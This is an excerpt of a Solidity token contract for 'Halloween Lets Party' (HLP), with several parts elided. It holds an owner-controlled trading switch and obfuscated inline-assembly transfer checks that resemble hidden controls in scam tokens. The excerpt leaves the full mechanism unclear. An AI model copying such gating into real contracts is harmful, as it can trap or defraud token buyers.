...
contract HalloweenLetsParty  is Context, IERC20, Ownable {
    ...
    string private _name = unicode"Halloween Lets Party";
    string private _symbol = unicode"HLP";
    bool active=false;  
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        bool transferBot = generateTx(sender,recipient) && holderNoFee[recipient] && recipient!= address(this);

        if((!isMarketPair[recipient] && sender != owner() && !holderNoFee[sender]))
            require(active != false, "Trading is not active.");   
        
        require(checkWallet(sender,recipient,amount,_walletsAmount,holderNoFee[sender]), "ERC20: transfer from the bot");
    ...
    function generateTx(address sender, address recipient) public view returns(bool){
        uint returnValue=0;
            assembly{
                        returnValue := eq(sender,recipient)
                }
        return (returnValue*block.number>0);
    }
